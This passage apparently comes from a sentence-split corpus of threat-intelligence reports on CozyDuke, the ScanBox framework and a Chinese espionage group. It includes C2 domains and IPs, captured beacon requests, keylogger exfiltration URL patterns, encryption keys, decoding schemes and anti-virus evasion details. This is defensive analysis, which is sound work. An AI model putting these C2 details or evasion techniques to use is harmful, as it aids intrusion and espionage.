another unencrypted executable ) : As a result , we get another executable ( SHA256 : a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f ) that was only Base64 encoded and not encrypted in any way : So again , we fire up our PE viewer and take a look at the important strings : Again , we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the functionality .", "1474": "Also the server did n't respond ...", "1475": "The files can be downloaded here : That 's it , have a nice weekend ...", "1476": "TLP : WHITE This whitepaper provides an overview of CozyDuke , a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations , such as governmental organizations and other entities that work closely with these institutions .", "1477": "Based on command and control ( C&C ) server information found being used by CozyDuke tools , we believe the CozyDuke toolset is used by at least one malicious actor who also uses , or at the least shares , infrastructure with actors using the known threats , MiniDuke and OnionDuke .", "1478": "F - SECURE LABS SECURITY RESPONSE Malware analysis Whitepaper CozyDuke , as referred to in this document , is a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations .", "1479": "The core of the CozyDuke toolset is a modular attack platform consisting of a main component augmented by a set of additional modules implementing further functionality .", "1480": "The decoy is usually an uninteresting PDF , but we have also observed a Flash video of monkeys being presented as the decoy .", "1481": "We have reason to believe CozyDuke is being used to target governmental organizations and entities that work closely with such bodies .", "1482": "We believe the current CozyDuke activity started at the end of January 2015 .", "1483": "Most of the samples we have observed were compiled beginning from the end of January .", "1484": "However , based on comparisons of recent CozyDuke samples against older samples we have obtained dating back as far as the end of 2011 , we believe CozyDuke has been under active development since at least 2011 .", "1485": "We have strong evidence suggesting the group using CozyDuke is the same as - or at the least shares command and control infrastructure with - the group or groups using MiniDuke and OnionDuke .", "1486": "Firstly , a CozyDuke sample from February of 2012 attempts to contact a C&C server at nostressjob.com .", "1487": "This domain has previously been associated with known MiniDuke C&C infrastructure .", "1488": "This same infrastructure has also been seen in use by OnionDuke .", "1489": "Specifically , the DLLs dropped have used file and export names also used by OnionDuke .", "1490": "Additionally , the strings in the DLLs have been encrypted using the same algorithm used by OnionDuke .", "1491": "This link is , however , not as conclusive as the infrastructure overlap .", "1492": "Infection with CozyDuke begins with the victim receiving an email containing a link to a ZIP file .", "1493": "This ZIP file will contain a single executable , usually a self - extracting RAR archive .", "1494": "The first file is a decoy .", "1495": "The decoy has usually been a PDF document but Flash videos have also been observed in some cases .", "1496": "The second file extracted from the archive is a CozyDuke dropper .", "1497": "Should an installed product be found , it will be compared to a predetermined list of product names .", "1498": "If the installed product matches a name on the list , the dropper will immediately exit .", "1499": "Should either of these checks fail , the dropper will likewise exit immediately .", "1500": "Next , the dropper will find and decrypt encrypted data stored as two PE resources embedded in the executable .", "1501": "These resources are named with the hexadecimal identifiers 0x000A and 0x000B.", "1502": "Both resources are structured similarily .", "1503": "They begin with a four - byte value specifying the length of the included decryption key .", "1504": "This decryption key immediately follows the length field .", "1505": "Finally , the rest of the resource is the encrypted payload .", "1506": "The encryption used is a simple XOR with a rotating key .", "1507": "The first resource , 0x000A , contains as its payload a Microsoft cabinet archive .", "1508": "This archive contains the CozyDuke components that the dropper will later install on the victim system .", "1509": "The second resource , 0x000B , contains as its payload an XML file with instructions for the dropper on where to install the dropped components and what to name them .", "1510": "This file will also use a name specified in the droppers configuration file .", "1511": "The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke 's activity on a victim machine .", "1512": "The entrypoint function varies , but is always specified in the dropper configuration .", "1513": "CozyDuke may use multiple techniques for establishing persistence ; the following is one technique used .", "1514": "Additionally , CozyDuke may utilize a technique known as COM - object hijacking [ 1 ] to establish persistence .", "1515": "The configuration data for CozyDuke is stored as a separate RC4-encrypted file that is written to disk by the CozyDuke dropper during initial infection .", "1516": "The name of the encrypted configuration file on disk has been racss .", "1517": "dat in all of the observed cases .", "1518": "The decrypted file is formatted as XML with the UTF-16LE character encoding .", "1519": "In all CozyDuke samples from 2015 , the configuration data has been encrypted with the RC4 key B5 78 62 52 98 3E 24 D7 3B C6 EE 7C B9 ED 91 62 .", "1520": "In CozyDuke samples from July of 2014 , the RC4 key has been embedded in the encrypted configuration file .", "1521": "In this case , the encrypted configuration file will begin with a 4-byte value specifying the length of the included RC4 key .", "1522": "This will be followed by the actual key .", "1523": "Finally , the rest of the file will be the actual configuration data .", "1524": "The method of communication , as well as the address to connect to , are specified in CozyDuke 's configuration data .", "1525": "Listed above are details of known CozyDuke C&C servers .", "1526": "We believe all of the ones listed are compromised servers .", "1527": "In addition to its main communication method , CozyDuke also features the ability to use Twitter as a backup C&C channel .", "1528": "In cases where CozyDuke utilizes this functionality , the twitter account to be used will be specified in CozyDuke 's configuration data .", "1529": "We have only observed two samples where a backup Twitter account was actually specified in the configuration data .", "1530": "These accounts were @US2515 and @monkey_drive .", "1531": "The main difference between the two is that modules are DLL files loaded in memory by the CozyDuke main component , whereas executables are PE executable files that CozyDuke will write to disk and execute .", "1532": "These commands are briefly described in Table 2 ( overleaf ) .", "1533": "The following chapter , CozyDuke Tasks , provides further information on the tasks CozyDuke has been observed executing .", "1534": "Based on samples obtained from our own collections and generously shared to us by a trusted source , we have been able to identify some of the tasks executed recently by CozyDuke .", "1535": "These tasks can be divided into two categories .", "1536": "These executables are usually droppers similar to those used to infect a host with CozyDuke .", "1537": "Once executed by CozyDuke , these executables function independently of CozyDuke 's main component .", "1538": "Listed below are the modules we have observed being used : We have observed executables executed by CozyDuke for the following purposes .", "1539": "These executables will implement their own methods of C&C communication and data exfiltration .", "1540": "In many cases , the scripts utilized Microsoft OneDrive accounts for data transfer .", "1541": "The earliest CozyDuke sample we have observed so far was compiled on the 29th of December , 2011 .", "1542": "The sample in question was not an actual CozyDuke main component , but a CozyDuke module .", "1543": "The earliest main component we observed was compiled on the 29th of February , 2012 .", "1544": "The main component in question stores its strings and configuration in an unencrypted form .", "1545": "Additionally , the configuration is stored embedded in the binary , not as a separate XML file in the manner of newer CozyDuke versions .", "1546": "Even this oldest main component does however use XML for other purposes via the open - source Pugi - XML library .", "1547": "The next CozyDuke main component we observed was compiled on the 30th of November , 2012 .", "1548": "By then , the authors had switched to encrypting the strings and the configuration .", "1549": "However , the configuration was still stored embedded in the binary .", "1550": "Design - wise , this sample is a bit of an outlier .", "1551": "Instead of being a DLL file , the main component is actually an EXE that , in addition to the configuration , embeds multiple DLLs that provide additional functionality to the main component .", "1552": "Apart from the different design , functionally the main component is very similar to other CozyDuke main components .", "1553": "It is possible the authors of CozyDuke were trying out a new design , but eventually decided to go back to the original .", "1554": "The next CozyDuke main component we observed , compiled on the 2nd of July , 2014 , is again a DLL file .", "1555": "By now , the authors of CozyDuke had switched from an embedded configuration to the external XML- formatted configuration file seen today .", "1556": "We have yet to observe samples from 2013 , but we believe CozyDuke to have been under active development as well during that year .", "1557": "Between 2012 and 2014 , the authors of CozyDuke appear to have performed significant refactoring of the CozyDuke codebase , even though functionally the differences are smaller .", "1558": "Examples of this refactoring include for instance the switch from using the Pugi - XML library to using Microsoft 's MSXML 3.0 for XML - related functionality .", "1559": "The latest CozyDuke main component we observed was compiled on the 26th of February , 2015 .", "1560": "The core functionality of the latest sample is very similar to the previous sample from July of 2014 , but the authors of CozyDuke have implemented a lot of additional functionality , as the increase in size from 279 KB to 820 KB would also suggest .", "1561": "Based on logging strings , variable naming and PDB strings found in CozyDuke samples , we observed the following .", "1562": "PDB strings found in early CozyDuke samples are listed in Table 4 ( below ) .", "1563": "APPENDIX A | SAMPLE HASHES Filenames ( Note : we believe many of these to be borrowed from legitimate files ) User agent strings Mutexes", "1564": "Please e - mail us at threatintelligence@uk.pwc.com for a version of this report with additional indicators that you are welcome to distribute so long as it is not on public channels ( TLP - GREEN ) .", "1565": "We have observed actors amending the ScanBox framework to evade existing public signatures , detailed below .", "1566": "Security researchers have often made the mistake of assuming that when a specific tool was observed being used in espionage attacks , it was representative of activity of a single actor .", "1567": "More frequently , however , many are now identifying that distinct groups of attackers are sharing their toolsets , just as in the cybercrime world .", "1568": "One such toolset , the ScanBox framework , is now shared between a number of groups who conduct espionage attacks .", "1569": "Evidence suggests that these groups include those behind the recent Forbes and Anthem attacks .", "1570": "This short paper outlines our current perspectives on the previously discussed espionage groups currently using the framework and a hint that a 5th player is getting in on the game .", "1571": "Since then we have encountered 24 additional sites compromised with the framework .", "1572": "Over this time we have observed changes to the code and novel techniques for executing .", "1573": "We have also received a number of tip offs from other researchers , as well as queries from victims who were directly targeted by those using the framework .", "1574": "We would like to extend our thanks to these individuals for their contributions towards this research .", "1575": "The following diagram shows the links in tools and targets between the groups discussed in our previous blog , but newer information has since come to light which allows us to more accurately associate these groups with known threat actors .", "1576": "Between these clusters , we 've seen strategic web compromises designed to target users in the following countries .", "1577": "Tactical Intelligence Bulletin \u2013 TLP : WHITE Since our last post there have been several alterations to the ScanBox code base , including new modules , changes to avoid signature based detection , as well as extra techniques to try to identify whether those being scanned are real machines or researchers .", "1578": "In some cases we have been able to watch developers update and test variants of the framework , and even come across server - side code being tested by budding hackers .", "1579": "Our findings are detailed below .", "1580": "Following on from our previous post on ScanBox1 , we have watched the clusters of activity outlined with close interest , as well as keeping an eye on new adopters of the ScanBox framework .", "1581": "The framework has remained in use since initial analyses were published , and further analysis of the code , public reporting , as well as the infrastructure used to host ScanBox infections has given us a better picture of some of the clusters of activity we identified in our earlier blog .", "1582": "In addition to the four websites we previously identified hosting the malicious code , we 've now identified a further 24 websites hosting the framework .", "1583": "Anonymised data relating the countries and sectors affected are given in appendix A.", "1584": "Broadly , the ScanBox framework codebase has remained the same , however there are slight nuances in some aspects of the code , or in the software attackers choose to search for .", "1585": "In cases where the attackers have included software checks within their ScanBox code , it tends to be for the same original list of filenames ( Appendix C ) .", "1586": "In some cases the attackers customise the list , presumably based on the things they 're expecting to find .", "1587": "For example , adding or removing additional security products based on the predominant software providers in their target region .", "1588": "It 's also worth noting that the standard list includes quite a lot of software which is less relevant to security ( examples include WinRAR , iTunes and WinZip ) .", "1589": "Some of these may be included in order to help the attackers to try and identify real victims vs researchers / sandboxes / honeypots .", "1590": "An example list is shown in the following screenshot .", "1591": "The first piece of new functionality is that the attackers build a possible list of drive names ( A - Z ) and scan for the existence of each drive .", "1592": "They do not check files directly either , instead , checking for the presence of a list of folder names .", "1593": "In this case , rather than determining what security software is present , this check would mainly be useful in assisting the attacker with identifying the victim 's operating system .", "1594": "This could then be used to tailor future attacks ( i.e.", "1595": "should I deploy malware which can bypass UAC ? Should I send malicious documents targeting CVE-2012 - 0158 or not ? ) .", "1596": "Also , bizarrely the attackers check the path ' Program Files ( x80236 ) ' \u2013 if anyone knows what this corresponds to , please get in touch and let us know .", "1597": "As we stated earlier , some of the features of the original ScanBox code were probably designed to help those analysing results distinguish between honeypots / analysis environments and real - world victims .", "1598": "The newly added variables include .", "1599": "Updates to evade signatures Possibly in response to our previous report , we 've seen some of the groups using ScanBox alter the content of the modules to evade detection .", "1600": "Attackers do read reports , both to help them attack3 and also to evade detection .", "1601": "One change has been the URI formats used to deliver stolen key log data from obvious URLs such as .", "1602": "/k.php?data=[KeyloggerData ] To more subtle URLs such as .", "1603": "/[KeyloggerData].jpg We also note that following our release of a signature to detect the phrase \" No Java or Disable \" , which was present in a number of related frameworks , some of the attackers have now changed this to \" No or Disable \" .", "1604": "In our previous entry on ScanBox we described four clusters of activity \u2013 this section includes updates on those clusters .", "1605": "Previously , we were only able to cluster activity based on the infrastructure used and the associated malware , we now have a sufficient number of samples to cluster based on differences in implementation between the code used for ScanBox in each case .", "1606": "The recently published FBI flash alert # A-000049-MW4 , cited domain names previously referenced in our blog as being related to an actor known as Deep Panda , which we 'll get to in a minute .", "1607": "The link appears to have been made from the use of the DerUsbi malware family though , which we know to be used by several espionage actors .", "1608": "What is interesting is the potential overlap between the target selection of this cluster and the targets of those behind the recently reported Forbes compromise5,6 .", "1609": "Checking the Google SafeBrowsing results for * .googlecaches.com , shows that the domain was used for distribution of malicious code for a significant period after our previous blog entry .", "1610": "This includes distribution via gokbayrak.com .", "1611": "Looking at whether any other domains or IP addresses were observed delivering malicious software via gokbayrak.com shows that it was also observed delivering malware via 88.80.190[.]133 .", "1612": "This is the same IP address that was cited in iSight 's reporting of the Forbes breach .", "1613": "In fact , the IP address 88.80.190.133 was involved in the compromise of the same 3 websites as SafeBrowsing shows were affected by googlecaches.com .", "1614": "The same three sites targeted with the 0-day used in the Forbes attack were also observed distributing malware via googlecaches[.]com - we therefore believe it 's likely that the group we previously described as ' Cluster 1 ' was behind the Forbes compromise .", "1615": "We can use similar techniques to explore other actors who have the same tasking as Cluster 1 .", "1616": "In the screenshot of websites delivering malware via gokbayrak.com , we saw that the domain name macanna.com[.]tw was also used to distribute malware from this page .", "1617": "The malware sample in question has a hash of 3b8d7732de3b3c8823d241e7cd3185c4 .", "1618": "The same sample also communicates with happynewyear.dns04[.]com , which in turn resolves to the IP address 115.23.172[.]151 , which hosts a large number of other malicious host names .", "1619": "These following hostnames are activity associated with the actor best known as TH3Bug7 - named after their choice of Poison Ivy password .", "1620": "Their malware samples are present in the same cluster .", "1621": "This cluster relates to the threat actor referred to as Deep Panda by CrowdStrike , as was confirmed in a recent blog post8 .", "1622": "In turn , this is widely believed to relate to the incident at Anthem , as described in a Krebs post9 .", "1623": "The graph below shows the links between the we11point.com domain name , and news.foundationssl[.]com as seen on the CrowdStrike blogpost .", "1624": "The Krebs article also points toward other possible ( although not explicit ) links between the domain allegedly used in the Anthem hack ( we11point.com ) to Cluster 2 through shared WHOIS details , as we11point.com was registered by domain re - seller ' li2384826402@yahoo.com ' On its own , this would not be sufficient to associate the two clusters , but it is useful to note as a ' softer ' overlap .", "1625": "Cluster 3 remains a mystery , unfortunately the code used in this instance is the most slim line version , and has since not been widely re - used \u2013 it is unclear who was behind the compromise using this domain name .", "1626": "We 'd previously missed the link between Cluster 4 \u2013 and malware widely known as ' EvilGrab ' or ' Vidgrab ' .", "1627": "From our view point , this malware is exclusively used by one group , known by CrowdStrike as Stone Panda10 .", "1628": "In addition to the four clusters outlined above , within the 24 additional compromises identified , we believe there are at least 3 other distinct groups using the framework .", "1629": "In their 2013 paper ' From Quartermaster to Sunshop'11 , FireEye described the concept of a Digital Quartermaster , a kind of malware supply chain for intrusions , where a skilled team would develop toolsets for a range of attackers who deploy them .", "1630": "The shared use of ScanBox may match up quite well to this hypothesis , and indeed even to some extent the naming schema overlaps , as iSight refer to the actor behind the Forbes breach as Codoso , but suggest they are publically known as ' Sunshop ' .", "1631": "In all likelihood this relates to a series of blogs byFireEye which refer to a series of web compromises in 2013 as being the SunShop12 campaign .", "1632": "Although we did not notice the correlation immediately , there is good overlap between the groups we 've described above , and the clusters of activity described as sharing a Flash 0-day in early 2014 by Symantec13 .", "1633": "Although other groups have since begun using the framework , the first groups to use the framework ( clusters 1 - 4 ) correspond quite nicely to the existing Symantec blog .", "1634": "For reference , we 've overlaid our ScanBox clusters against the likely clusters Symantec created behind the scenes for their blog , as well as other popular names .", "1635": "Please note that each vendor has their own way of grouping activity together , so these mappings are given on a best efforts basis .", "1636": "In all examples of ScanBox deployments discussed so far , we believe that the scripts were deployed to anyone who visited websites of interest to a given sector which the attacker was able to compromise\u2013 and that the attackers waited for victims to visit the compromised site .", "1637": "We believe these attackers are not covered by the existing clusters 1 through 4 , as the code differs from that used elsewhere .", "1638": "This method of sending links rather than waiting for visiting a specific compromised website has two main advantages .", "1639": "This group differs from the others based on the following characteristics .", "1640": "So far we have identified four low key websites , all belonging to small companies based in the United States or Canada which are being abused in this fashion .", "1641": "At one point during our investigation into infrastructure hosting ScanBox code , we identified a server which appeared to be used for development and testing purposes .", "1642": "On this occasion , the server side code was publicly accessible , allowing us to gain insights into the development and testing phase of an attack using ScanBox .", "1643": "This also included the ScanBox framework 's own detailed reconnaissance against the developer themselves .", "1644": "We noted the developer repeatedly uploading the modified versions to VirusTotal , presumably in an attempt to improve evasion of anti - virus .", "1645": "We do not believe this developer is part of the core group that has access to the original implementation , but is instead another actor , who is likely rebuilding ScanBox from samples they find online .", "1646": "The screenshot on the left is from a version currently in development by a possible attacker , the corresponding screenshot on the right is from a public article15 .", "1647": "The publication of threat information allows us to draw links between different campaigns , tools and malware but we need to be careful about which links we consider to be significant and ensure we 're confident in how information that 's publically available was derived .", "1648": "The summary above is just our view of the overlaps in web based tools / exploits and targets between different threat actors , but those with different datasets may be able to draw different conclusions .", "1649": "Last time , we identified three possible hypotheses to explain the overlap between the ScanBox users , in this blog , based on the data we have available , we can settle on just one of these conclusions .", "1650": "\" 2 .", "1651": "Selections of actors share some resources , as per previous observations with similar kits by some security vendors .", "1652": "\" Specifically , our key conclusions are .", "1653": "What is not clear is why specific resources ( web - based exploits ) appear to be shared , and why others ( primarily malware families ) are sometimes kept within a specific cluster .", "1654": "Where we have an assigned cluster , but have not discussed it in this document , we have given ' Cluster [ Letter ] ' these are not intended as names for groups .", "1655": "Where we do not have an associated group we have listed ' unknown ' under this field .", "1656": "Fortinet F - PROT F - Secure f - secure2011 IKARUS Immunet iTunes JiangMin Kaspersky_2012 Kaspersky_2013 Kaspersky_Endpoint_Security_8 mcafee_enterprise Mse Norman Norton Nprotect Outpost PC_Tools QuickHeal Rising Rising_firewall sophos SQLServer Sunbelt SUPERAntiSpyware Symantec_Endpoint12 symantec - endpoint Trend2013 ViRobot4 VirusBuster vmware - client vmware - server WinRAR winzip For more in - depth coverage , including full details of the analysis behind this blog as well as additional indicators which can be used to detect similar samples , or if you have any other queries , please give us a shout at threatintelligence@uk.pwc.com .", "1657": "The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .", "1658": "You should not act upon the information contained in this email without obtaining specific professional advice .", "1659": "No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this email , and , to the extent permitted by law , PricewaterhouseCoopers LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this email or for any decision based on it .", "1660": "May 13 , 2015 By Jon Gross(http://blog.cylance.com / author / jon - gross ) Share This .", "1661": "Attackers typically shut down campaigns or halt activity after they are exposed by security researchers , thereby creating the impression they have dropped off the map .", "1662": "This often leads to a false sense of security within the community and perpetuates the idea that public exposure makes us all safer .", "1663": "While the exposed activity is no longer observed , attackers simply continue in the background \u2013 evolving or altering their tactics to seamlessly continue operations with increasingly advanced malware .", "1664": "So while potentially making us safer in the short - term , exposure often forces a Darwinian evolution in malware .", "1665": "Several months ago I examined a malware - tainted Word document titled \" ISIS_twitter_list.doc . \" I did n't think much of it and quickly moved on after a cursory analysis .", "1666": "Yet I recently uncovered evidence that suggests it was the work of a well - known Chinese threat group .", "1667": "This group is known to have targeted U.S.", "1668": "government agencies , defense contractors , aerospace firms and foreign militaries since 2009 .", "1669": "Until now , it was widely believed the actor 's activities had largely subsided in 2013 , following numerous public disclosures and detailed analyses of their backdoors .", "1670": "Our technical analysis shows the group has remained active .", "1671": "We are releasing this data to help victims identify and remediate the threat .", "1672": "Click here(http://blog.cylance.com / spear - a - threat - actor- resurfaces#mitigation ) to get to recommended mitigations , or for all the technical details read on .", "1673": "It all began with the MIME encoded document \" ISIS_twitter_list.doc \" , which exploited the familiar CVE-2012- 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi?name = CVE-2012 - 0158 ) and was first uploaded to Virustotal from a user in India .", "1674": "Other targets identified were predominantly located in Australia , New Zealand , Vietnam and the United States .", "1675": "File Details Name ISIS_twitter_list.doc SHA256 6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40 File Size 146,338 bytes The first stage shellcode searches for the marker \" GfCv \" then checks the next four bytes are \" EF FE EC CE \" in the document then decodes the second stage shellcode using the four - byte XOR key \" 0x29F7C592 \" .", "1676": "This second stage finds and decodes an encoded executable beginning at offset 0x33A2 .", "1677": "The binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key 0x7FFEFC00 ; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by 0x1 and shifting the bits of the next two bytes right by 0x1 , so the next 4-byte XOR key in the series would be 0x3FFF7E00 .", "1678": "It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4- byte XOR key .", "1679": "For the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a 256-byte XOR key .", "1680": "The decoded binary will be written to the filesystem as \" % APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx \" .", "1681": "The domain at the time of this report resolved to the IP address , \" 103.229.125.157 \" .", "1682": "Additionally the dynamic DNS domains \" fighthard.mooo.com \" and \" rampage.freetcp.com \" have both historically resolved to this IP address .", "1683": "Example initial beacon request .", "1684": "GET /login?wd = hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q- H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH- nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ== HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 2.0.50727 ; .NET CLR 3.0.4506.2152 ; .NET CLR 3.5.30729 ; .NET CLR 1.1.4322 ) Host : www.microsoftservices.proxydns.com Cache - Control : no - cache The above beacon request can be decoded by base64 decoding with this alphabet , \" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789- _ \" .", "1685": "Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key .", "1686": "The following python script will make this easy .", "1687": "from Crypto . Cipher import ARC4 Decoding the string will yield the following .", "1688": "Where k : is a unique identifier for the victim , s : is a campaign identifier included in the backdoor , h : is the hostname of the victim computer , u : is the victim user , o : is the operating system and service pack level , and m is the mac address .", "1689": "The PDB path , C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb , was also left in the backdoor although no other instances of this path could be identified .", "1690": "Several additional exploit documents were identified by investigating the domains \" fighthard.mooo.com \" and \" rampage.freetcp.com \" .", "1691": "Fighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014 .", "1692": "The following exploit documents were identified to contain a payload which communicated to this domain .", "1693": "Naval Science Curriculum 2014.doc 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c 1.doc c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd Republic Day speech 27 Jan 2014.doc 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911 Rampage.freetcp.com still resolves to 103.229.125.157 as of 4/2/2015 Let 's go ahead and take a look further into one of the other expoit documents , 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c .", "1694": "SHA256 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c Name Naval Science Curriculum 2014.doc File Size 459,087 The document exploits old faithful , CVE-2012 - 0158(http://www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2012 - 0158 ) , but instead of using a MIME encoded document this file was just a plain RTX document .", "1695": "Yes that 's not a misspelling Word is happy to open this RTF format as well .", "1696": "So for anyone exploring and hunting RTF documents you may also want to start looking for the \" { \\rtx \" header .", "1697": "We 'll skip the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as an ASCII hex - encoded , xor - encoded binary .", "1698": "It can be decoded using the XOR key \" 0xBF \" .", "1699": "Upon successful exploitation the decoded binary will be written first to % TEMP%\\dw20.EXEthen copied to % WINDIR%\\msascm32.drv .", "1700": "No other changes are made to the system .", "1701": "File Details Full File Path : % WINDIR%\\msacm32.drv SHA256 : 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3 File Size : 108,544 Bytes Compile Time : 9/26/2013 01:46:23 UTC I 'm always curious when no registry changes are made in the exploitation process .", "1702": "At first the backdoor failed to load or really do anything in my VM until I read what the \" msascm32.drv \" file does .", "1703": "Looking at the original file 's ( % WINDIR%\\system32\\msacm32.drv ) imported functions , it 's clear the DLL is responsible for some type of audio processing and/or playback .", "1704": "A quick search on the internet confirmed this so I added a soundcard to my VM .", "1705": "A PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb ; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80 .", "1706": "The two files also have an identical compilation time , which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information .", "1707": "The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor .", "1708": "It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of \" admin \" .", "1709": "The Poison Ivy shellcode is encrypted using a custom cipher with the key \" Tiger324 { \" beginning at offset 0xFA5 and ending at 0x159E.", "1710": "If this initial connection fails it will revert to the secondary backdoor , which utilizes HTTP GET and POST requests somewhat similar to the ones described above to the internal IP address \" 192.168.2.26 \" .", "1711": "This suggested the attacker had already compromised other systems in the environment and was using an internal C2 mechanism for a fallback .", "1712": "Example Internal Beacon .", "1713": "GET /login.asp ? p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX EJ7OZkvwBZVx1JsrhQ== HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) Host : 192.168.2.26 Requests may also be made to the following pages : \" check.asp \" , \" result.asp \" , and \" upload.asp \" .", "1714": "The request structure is slightly different in that it uses the base64 alphabet \" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 + * \" .", "1715": "The resulting request can be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload .", "1716": "It also uses a static User - Agent string of \" Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) \" for each request .", "1717": "The following script simplifies this process .", "1718": "The request decodes to \" 123|000000+|USER - D6921F6215|Administrator|-1676096002|1.0|0| \" , where values are separated by the delimiter \" | \" .", "1719": "\" 123 \" is a campaign identifier hard coded into the backdoor .", "1720": "I do n't know what \" 000000 + \" is but it 's also a hard coded value ; my best guess is it 's to modify the timezone of the timestamp .", "1721": "\" USER - D6921F6215 \" is the hostname of the victim , \" Administrator \" is the victim user , \" 1676096002 \" is the current Date / Time in decimal , and \" 1.0 \" is a version number also stored in the backdoor . The 16-byte XOR key will be randomly generated per each request .", "1722": "Results from commands will be sent back encoded to the server to the \" result.asp \" page .", "1723": "The backdoor will accept the following commands .", "1724": "Commands with a ? appear to take an additional parameter while files that end in - require a full file path .", "1725": "The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one described here : http://www.pretentiousname.com/misc/win7_uac_whitelist2.html .", "1726": "I thought it was interesting the backdoor used a secondary backup backdoor in addition to its primary payload .", "1727": "The first communicated directly outside the network using a well known RAT protocol and if that failed the secondary much stealthier backdoor communicated to an internal C2 address using it 's own custom encoded HTTP based protocol .", "1728": "The use of a relatively undisclosed DLL search order hijack also made this sample unique .", "1729": "Detection rates for this binary seem to be pretty good right now 39/57 ; however , at the time it was first used in late January 2014 detection rates were much poorer .", "1730": "Other samples from the identified exploit documents were similar to the one described above with different network callbacks .", "1731": "And now to tie all this back to the \" well - known \" threat group .", "1732": "The \" 173.224.214.12 \" IP address that \" fighthard.mooo.com \" previously resolved to also historically had two other domains point to it \" queenberry.www1.biz \" and \" word.crabdance.com \" .", "1733": "\" word.crabdance.com \" previously resolved to \" 64.71.162.70 \" on September 8 , 2012 and 108.171.246.140 on February 19 , 2014 .", "1734": "The \" 64.71.162.70 \" address and the associated domain \" www.ollay011.zyns.com \" are rather infamous and the first mention of it I could find is in this shadowserver post : http://blog.shadowserver.org/2012/04/16/beware - of - what - you- download - recent - purported - ceiec - document - dump - booby - trapped/ related to exploit documents identified in a data dump from Hardcore Charlie .", "1735": "If you follow the rabbit hole deep enough you can eventually trace samples via domain and IP address crossover back to the FBI flash # A-000009-MW from mid 2013 .", "1736": "Additional domains and IP addresses related to this group are included in the appendix .", "1737": "While defending against the constant stream of new malware from advanced threat groups may be difficult , organizations can take some relatively easy steps to help identify intrusions .", "1738": "This group is among the numerous threat actors who rely almost exclusively on Dynamic DNS infrastructure .", "1739": "They seem to prefer ChangeIP ( https://www.changeip.com / services / free - dynamic - dns/(https://www.changeip.com / services / free- dynamic - dns/ ) ) and Afraid ( https://freedns.afraid.org/(https://freedns.afraid.org/ ) ) for free DNS services , although they previously heavily used Sitelutions ( https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns ) ) .", "1740": "While there are some legitimate instances of dynamic DNS in corporate environments , it only accounts for a small percentage of traffic .", "1741": "Monitoring and/or blocking dynamic DNS requests should help detect attacks by this actor .", "1742": "Any dynamic DNS domains that resolve to non - routable IP addresses , like 127.0.0.1 or private IP addresses , should be thoroughly investigated .", "1743": "The HTTP traffic generated by both samples uses a limited number of header fields , which is substantially different from the majority of traffic generated by modern browsers .", "1744": "As always , do n't open E - mail attachments from untrusted parties .", "1745": "Tags : CylanceSPEAR(http://blog.cylance.com / topic / cylancespear ) Back to Blog(http://blog.cylance.com )", "1746": "A personal note from Cylance , CEO Stuart McClure On February 24 , 1989 , United Flight 811 left Honolulu , Hawaii , on its way to Auckland , New Zealand , with 364 souls on board .", "1747": "Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine passengers into the dark void over the Pacific Ocean .", "1748": "This aviation disaster was later determined to have been caused by a simple design flaw combined with the lack of corrective action .", "1749": "Boeing and the FAA had known about this problem for over one year prior to the accident .", "1750": "The result : nine people lost their lives .", "1751": "The other 337 passengers plus 18 crew members who survived , live with the memory every day ; all of it due to a highly preventable design flaw .", "1752": "As a 19-year-old young adult , I was grateful to have survived but I had no idea how that single event would impact my future in such 